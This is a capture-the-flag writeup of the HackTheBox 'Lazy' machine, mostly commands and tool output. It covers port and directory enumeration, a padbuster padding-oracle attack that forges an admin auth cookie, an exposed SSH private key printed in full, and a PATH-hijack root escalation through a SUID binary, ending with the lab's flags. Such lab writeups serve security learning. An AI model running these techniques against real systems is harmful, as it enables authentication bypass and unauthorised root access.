---
layout: post
title: Hackthebox Lazy Writeup
categories: HackTheBox
---

![placeholder](https://inar1.github.io/public/images/2019-06-10/lazy-badge.png)
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.<br>
This is a write-up of machine "Lazy" on that website.<br>
Lazy is a bit old machine but I needed to practice <a hreh="https://resources.infosecinstitute.com/padding-oracle-attack-2/#gref">Oracle Padding attack</a> for a ctf and Lazy is a good for that purpose.

## Solution
### 1. Initial Enumeration
Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.18 -sC -sV
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-10 12:49 EEST
Nmap scan report for 10.10.10.18
Host is up (0.035s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 e1:92:1b:48:f8:9b:63:96:d4:e5:7a:40:5f:a4:c8:33 (DSA)
|   2048 af:a0:0f:26:cd:1a:b5:1f:a7:ec:40:94:ef:3c:81:5f (RSA)
|   256 11:a3:2f:25:73:67:af:70:18:56:fe:a2:e3:54:81:e8 (ECDSA)
|_  256 96:81:9c:f4:b7:bc:1a:73:05:ea:ba:41:35:a4:66:b7 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: CompanyDev
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.57 seconds
{% endhighlight %}

Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php -s '200,204,301,302,403' -u http://10.10.10.18/

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.18/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2019/06/10 12:51:25 Starting gobuster
=====================================================
/images (Status: 301)
/index.php (Status: 200)
/login.php (Status: 200)
/register.php (Status: 200)
/header.php (Status: 200)
/footer.php (Status: 200)
/css (Status: 301)
/logout.php (Status: 302)
/classes (Status: 301)
/server-status (Status: 403)
=====================================================
2019/06/10 13:20:01 Finished
=====================================================
{% endhighlight %}

### 2. Getting User
Lazy has a website which we can login.<br>
We can also register a new user for us in following page.
![placeholder](https://inar1.github.io/public/images/2019-06-10/2019-06-10-13-43-35.png)

We can do user enumeration by trying to register a possible username.<br>
For example, have user "admin" here.
![placeholder](https://inar1.github.io/public/images/2019-06-10/2019-06-10-13-45-07.png)

Then, create a new user which name is "inar1" and login, we have following cookie for authentication.
![placeholder](https://inar1.github.io/public/images/2019-06-10/2019-06-10-13-52-36.png)
{% highlight shell %}
auth=GVeL9h27Y%2BJk5zAWW%2BiAHNproCe8AF5k
{% endhighlight %}

This looks like a base64 encoded text.<br>
However, it appears that this is unknown binary.
{% highlight shell %}
# URL decode
auth=GVeL9h27Y+Jk5zAWW+iAHNproCe8AF5k

# base64 decode
root@kali:~# echo -n "GVeL9h27Y+Jk5zAWW+iAHNproCe8AF5k" | base64 -d
W���c�d�0[��k�'�^d
{% endhighlight %}

Since I had similar situation in a CTF previously, it is not difficult to assume we can do "Oracle padding attack".<br>
We can use <a hreh="https://github.com/GDSSecurity/PadBuster">padbuster</a> to exploit the binary.<br>
When we run the script, at first we have to specify what is the response signatures we have to ignore.
{% highlight shell %}
root@kali:~# padbuster http://10.10.10.18/index.php GVeL9h27Y+Jk5zAWW+iAHNproCe8AF5k 8 --cookies auth=GVeL9h27Y+Jk5zAWW+iAHNproCe8AF5k

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 15

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 2 ***

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#	Freq	Status	Length	Location
-------------------------------------------------------
1	1	200	1133	N/A
2 **	255	200	15	N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended :  2
{% endhighlight %}

Then, wait for the result.<br>
We can decrypt the base64 and the value is "user=inar1".
{% highlight shell %}
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2

[+] Success: (126/256) [Byte 8]
[+] Success: (241/256) [Byte 7]
[+] Success: (47/256) [Byte 6]
[+] Success: (220/256) [Byte 5]
[+] Success: (127/256) [Byte 4]
[+] Success: (24/256) [Byte 3]
[+] Success: (221/256) [Byte 2]
[+] Success: (156/256) [Byte 1]

Block 1 Results:
[+] Cipher Text (HEX): 64e730165be8801c
[+] Intermediate Bytes (HEX): 6c24ee8420d20d83
[+] Plain Text: user=ina

Use of uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361, <STDIN> line 1.
*** Starting Block 2 of 2 ***

[+] Success: (229/256) [Byte 8]
[+] Success: (124/256) [Byte 7]
[+] Success: (19/256) [Byte 6]
[+] Success: (167/256) [Byte 5]
[+] Success: (235/256) [Byte 4]
[+] Success: (208/256) [Byte 3]
[+] Success: (47/256) [Byte 2]
[+] Success: (226/256) [Byte 1]

Block 2 Results:
[+] Cipher Text (HEX): da6ba027bc005e64
[+] Intermediate Bytes (HEX): 16d636105dee861a
[+] Plain Text: r1

-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): user=inar1

[+] Decrypted value (HEX): 757365723D696E617231060606060606

[+] Decrypted value (Base64): dXNlcj1pbmFyMQYGBgYGBg==

-------------------------------------------------------
{% endhighlight %}

So what we can assume is that if we forge the base64 encoded cookie with value "user=admin", we can bypass the authentication.
{% highlight shell %}
root@kali:~# padbuster http://10.10.10.18/index.php GVeL9h27Y+Jk5zAWW+iAHNproCe8AF5k 8 --cookies auth=GVeL9h27Y+Jk5zAWW+iAHNproCe8AF5k -plaintext user=admin

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 15

INFO: Starting PadBuster Encrypt Mode
[+] Number of Blocks: 2

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#	Freq	Status	Length	Location
-------------------------------------------------------
1	1	200	1133	N/A
2 **	255	200	15	N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2

[+] Success: (196/256) [Byte 8]
[+] Success: (148/256) [Byte 7]
[+] Success: (92/256) [Byte 6]
[+] Success: (41/256) [Byte 5]
[+] Success: (218/256) [Byte 4]
[+] Success: (136/256) [Byte 3]
[+] Success: (150/256) [Byte 2]
[+] Success: (190/256) [Byte 1]

Block 2 Results:
[+] New Cipher Text (HEX): 23037825d5a1683b
[+] Intermediate Bytes (HEX): 4a6d7e23d3a76e3d

[+] Success: (1/256) [Byte 8]
[+] Success: (36/256) [Byte 7]
[+] Success: (180/256) [Byte 6]
[+] Success: (17/256) [Byte 5]
[+] Success: (146/256) [Byte 4]
[+] Success: (50/256) [Byte 3]
[+] Success: (132/256) [Byte 2]
[+] Success: (135/256) [Byte 1]

Block 1 Results:
[+] New Cipher Text (HEX): 0408ad19d62eba93
[+] Intermediate Bytes (HEX): 717bc86beb4fdefe

-------------------------------------------------------
** Finished ***

[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
-------------------------------------------------------
{% endhighlight %}

Then try to access with the cookie "auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA".<br>
We can find an interesting path "/mysshkeywithnamemitsos"
![placeholder](https://inar1.github.io/public/images/2019-06-10/2019-06-10-14-35-06.png)

By accessing the url "http://10.10.10.18/mysshkeywithnamemitsos"
{% highlight shell %}
root@kali:~# curl -i http://10.10.10.18/mysshkeywithnamemitsos
HTTP/1.1 200 OK
Date: Mon, 10 Jun 2019 11:36:35 GMT
Server: Apache/2.4.7 (Ubuntu)
Last-Modified: Tue, 02 May 2017 15:25:54 GMT
ETag: "68f-54e8c27e07159"
Accept-Ranges: bytes
Content-Length: 1679

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqIkk7+JFhRPDbqA0D1ZB4HxS7Nn6GuEruDvTMS1EBZrUMa9r
upUZr2C4LVqd6+gm4WBDJj/CzAi+g9KxVGNAoT+Exqj0Z2a8Xpz7z42PmvK0Bgkk
3mwB6xmZBr968w9pznUio1GEf9i134x9g190yNa8XXdQ195cX6ysv1tPt/DXaYVq
OOheHpZZNZLTwh+aotEX34DnZLv97sdXZQ7km9qXMf7bqAuMop/ozavqz6ylzUHV
YKFPW3R7UwbEbkH+3GPf9IGOZSx710jTd1JV71t4avC5NNqHxUhZilni39jm/EXi
o1AC4ZKC1FqA/4YjQs4HtKv1AxwAFu7IYUeQ6QIDAQABAoIBAA79a7ieUnqcoGRF
gXvfuypBRIrmdFVRs7bGM2mLUiKBe+ATbyyAOHGd06PNDIC//D1Nd4t+XlARcwh8
g+MylLwCz0dwHZTY0WZE5iy2tZAdiB+FTq8twhnsA+1SuJfHxixjxLnr9TH9z2db
sootwlBesRBLHXilwWeNDyxR7cw5TauRBeXIzwG+pW8nBQt62/4ph/jNYabWZtji
jzSgHJIpmTO6OVERffcwK5TW/J5bHAys97OJVEQ7wc3rOVJS4I/PDFcteQKf9Mcb
+JHc6E2V2NHk00DPZmPEeqH9ylXsWRsirmpbMIZ/HTbnxJXKZJ8408p6Z+n/d8t5
gyoaRgECgYEA0oiSiVPb++auc5du9714TxLA5gpmaE9aaLNwEh4iLOS+Rtzp9jSp
b1auElzXPwACjKYpw709cNGV7bV8PPfBmtyNfHLeMTVf/E/jbRUO/000ZNznPnE7
SztdWk4UWPQx0lcSiShYymc1C/hvcgluKhdAi5m53MiPaNlmtORZ1sECgYEAzO61
apZQ0U629sx0OKn3YacY7bNQlXjl1bw5Lr0jkCIAGiquhUz2jpN7T+seTVPqHQbm
sClLuQ0vJEUAIcSUYOUbuqykdCbXSM3DqayNSiOSyk94Dzlh37Ah9xcCowKuBLnD
gl3dfVsRMNo0xppv4TUmq9//pe952MTf1z+7LCkCgYB2skMTo7DyC3OtfeI1UKBE
zIju6UwlYR/Syd/UhyKzdt+EKkbJ5ZTlTdRkS+2a+lF1pLUFQ2shcTh7RYffA7wm
qFQopsZ4reQI562MMYQ8EfYJK7ZAMSzB1J1kLYMxR7PTJ/4uUA4HRzrUHeQPQhvX
JTbhvfDY9kZMUc2jDN9NwQKBgQCI6VG6jAIiU/xYle9vi94CF6jH5WyI7+RdDwsE
9sezm4OF983wsKJoTo+rrODpuI5IJjwopO46C1zbVl3oMXUP5wDHjl+wWeKqeQ2n
ZehfB7UiBEWppiSFVR7b/Tt9vGSWM6Uyi5NWFGk/wghQRw1H4EKdwWECcyNsdts0
6xcZQQKBgQCB1C4QH0t6a7h5aAo/aZwJ+9JUSqsKat0E7ijmz2trYjsZPahPUsnm
+H9wn3Pf5kAt072/4N2LNuDzJeVVYiZUsDwGFDLiCbYyBVXgqtaVdHCfXwhWh1EN
pXoEbtCvgueAQmWpXVxaEiugA1eezU+bMiUmer1Qb/l1U9sNcW9DmA==
-----END RSA PRIVATE KEY-----
{% endhighlight %}

Since the path says "my ssh key with name mitsos", try to ssh with the name and key.
{% highlight shell %}
root@kali:~# curl http://10.10.10.18/mysshkeywithnamemitsos > mitsos_key
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1679  100  1679    0     0  23000      0 --:--:-- --:--:-- --:--:-- 23000


root@kali:~# cat mitsos_key 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqIkk7+JFhRPDbqA0D1ZB4HxS7Nn6GuEruDvTMS1EBZrUMa9r
upUZr2C4LVqd6+gm4WBDJj/CzAi+g9KxVGNAoT+Exqj0Z2a8Xpz7z42PmvK0Bgkk
3mwB6xmZBr968w9pznUio1GEf9i134x9g190yNa8XXdQ195cX6ysv1tPt/DXaYVq
OOheHpZZNZLTwh+aotEX34DnZLv97sdXZQ7km9qXMf7bqAuMop/ozavqz6ylzUHV
YKFPW3R7UwbEbkH+3GPf9IGOZSx710jTd1JV71t4avC5NNqHxUhZilni39jm/EXi
o1AC4ZKC1FqA/4YjQs4HtKv1AxwAFu7IYUeQ6QIDAQABAoIBAA79a7ieUnqcoGRF
gXvfuypBRIrmdFVRs7bGM2mLUiKBe+ATbyyAOHGd06PNDIC//D1Nd4t+XlARcwh8
g+MylLwCz0dwHZTY0WZE5iy2tZAdiB+FTq8twhnsA+1SuJfHxixjxLnr9TH9z2db
sootwlBesRBLHXilwWeNDyxR7cw5TauRBeXIzwG+pW8nBQt62/4ph/jNYabWZtji
jzSgHJIpmTO6OVERffcwK5TW/J5bHAys97OJVEQ7wc3rOVJS4I/PDFcteQKf9Mcb
+JHc6E2V2NHk00DPZmPEeqH9ylXsWRsirmpbMIZ/HTbnxJXKZJ8408p6Z+n/d8t5
gyoaRgECgYEA0oiSiVPb++auc5du9714TxLA5gpmaE9aaLNwEh4iLOS+Rtzp9jSp
b1auElzXPwACjKYpw709cNGV7bV8PPfBmtyNfHLeMTVf/E/jbRUO/000ZNznPnE7
SztdWk4UWPQx0lcSiShYymc1C/hvcgluKhdAi5m53MiPaNlmtORZ1sECgYEAzO61
apZQ0U629sx0OKn3YacY7bNQlXjl1bw5Lr0jkCIAGiquhUz2jpN7T+seTVPqHQbm
sClLuQ0vJEUAIcSUYOUbuqykdCbXSM3DqayNSiOSyk94Dzlh37Ah9xcCowKuBLnD
gl3dfVsRMNo0xppv4TUmq9//pe952MTf1z+7LCkCgYB2skMTo7DyC3OtfeI1UKBE
zIju6UwlYR/Syd/UhyKzdt+EKkbJ5ZTlTdRkS+2a+lF1pLUFQ2shcTh7RYffA7wm
qFQopsZ4reQI562MMYQ8EfYJK7ZAMSzB1J1kLYMxR7PTJ/4uUA4HRzrUHeQPQhvX
JTbhvfDY9kZMUc2jDN9NwQKBgQCI6VG6jAIiU/xYle9vi94CF6jH5WyI7+RdDwsE
9sezm4OF983wsKJoTo+rrODpuI5IJjwopO46C1zbVl3oMXUP5wDHjl+wWeKqeQ2n
ZehfB7UiBEWppiSFVR7b/Tt9vGSWM6Uyi5NWFGk/wghQRw1H4EKdwWECcyNsdts0
6xcZQQKBgQCB1C4QH0t6a7h5aAo/aZwJ+9JUSqsKat0E7ijmz2trYjsZPahPUsnm
+H9wn3Pf5kAt072/4N2LNuDzJeVVYiZUsDwGFDLiCbYyBVXgqtaVdHCfXwhWh1EN
pXoEbtCvgueAQmWpXVxaEiugA1eezU+bMiUmer1Qb/l1U9sNcW9DmA==
-----END RSA PRIVATE KEY-----


root@kali:~# chmod 600 mitsos_key 


root@kali:~# ssh mitsos@10.10.10.18 -i mitsos_key
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Mon Jun 10 13:49:27 EEST 2019

  System load: 0.0               Memory usage: 5%   Processes:       194
  Usage of /:  7.6% of 18.58GB   Swap usage:   0%   Users logged in: 0

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Thu Jan 18 10:29:40 2018
mitsos@LazyClown:~$
{% endhighlight %}

user.txt is in the home directory.
{% highlight shell %}
mitsos@LazyClown:~$ cat ~/user.txt 
d558e7924bdfe31266ec96b007dc63fc
{% endhighlight %}

### 3. Getting Root
Pretty strait forward.<br>
In the home directory of mitsos, we have a binary "backup" with SUID
{% highlight shell %}
mitsos@LazyClown:~$ ls -l
total 16
-rwsrwsr-x 1 root   root   7303 May  3  2017 backup
drwxrwxr-x 4 mitsos mitsos 4096 May  2  2017 peda
-r--r--r-- 1 mitsos mitsos   33 Jan 18  2018 user.txt
{% endhighlight %}

It looks like a binary. However, we can see a linux command "cat" is executed.
{% highlight shell %}
mitsos@LazyClown:~$ strings backup 
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
system
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRh
[^_]
cat /etc/shadow
;*2$"
GCC: (Ubuntu 4.8.4-2ubuntu1~14.04.3) 4.8.4

{% endhighlight %}

By creating a shell file "cat" and add the path at the beginning of $PATH, we can execute any command as root.
{% highlight shell %}
mitsos@LazyClown:~$ pwd
/home/mitsos


mitsos@LazyClown:~$ echo "/bin/sh" > cat


mitsos@LazyClown:~$ export PATH=~/:$PATH


mitsos@LazyClown:~$ ./backup


# id
uid=1000(mitsos) gid=1000(mitsos) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(mitsos)


# /bin/cat /root/root.txt
990b142c3cefd46a5e7d61f678d45515
{% endhighlight %}

